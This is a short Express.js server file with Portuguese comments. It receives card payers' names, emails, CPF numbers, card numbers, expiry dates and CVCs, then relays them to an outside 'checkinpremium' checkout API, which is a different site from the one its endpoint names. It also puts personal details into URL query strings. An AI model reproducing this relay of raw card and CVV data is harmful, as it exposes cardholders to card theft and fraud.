const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());

app.post('/process-nowpayments-card', async (req, res) => {
  const { name, email, cpf, number, expiry, cvc } = req.body;

  try {
    // 1. O seu servidor "digita" e envia automaticamente os dados para o checkinpremium
    // IMPORTANTE: Altere a URL abaixo para a API real ou webhook do checkinpremium
    const respostaCheckin = await axios.post('https://api.checkinpremium.com/v1/checkout', {
      customer_name: name,
      customer_email: email,
      customer_document: cpf,
      card_number: number,
      card_expiration: expiry,
      card_cvv: cvc,
      amount: 30.00 // R$ 30,00 fixos como no seu botão
    }, {
      headers: {
        'Authorization': 'Bearer SEU_TOKEN_AQUI', // Se o site exigir autenticação
        'Content-Type': 'application/json'
      }
    });

    // 2. Se o checkinpremium aceitou os dados, ele vai gerar um link de sucesso ou a página de checkout
    if (respostaCheckin.data && respostaCheckin.data.url) {
      return res.status(200).json({
        redirectUrl: respostaCheckin.data.url // URL que o React Native vai abrir na WebView
      });
    } else {
      // Caso o site deles use parâmetros de URL simples para preenchimento:
      const urlComDados = `https://checkinpremium.com/checkout?email=${encodeURIComponent(email)}&nome=${encodeURIComponent(name)}`;
      return res.status(200).json({ redirectUrl: urlComDados });
    }

  } catch (error) {
    console.error("Erro ao espelhar dados:", error.message);
    return res.status(500).json({ message: "Erro ao sincronizar com o gateway de pagamento." });
  }
});

// Inicialização do servidor local/Render
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));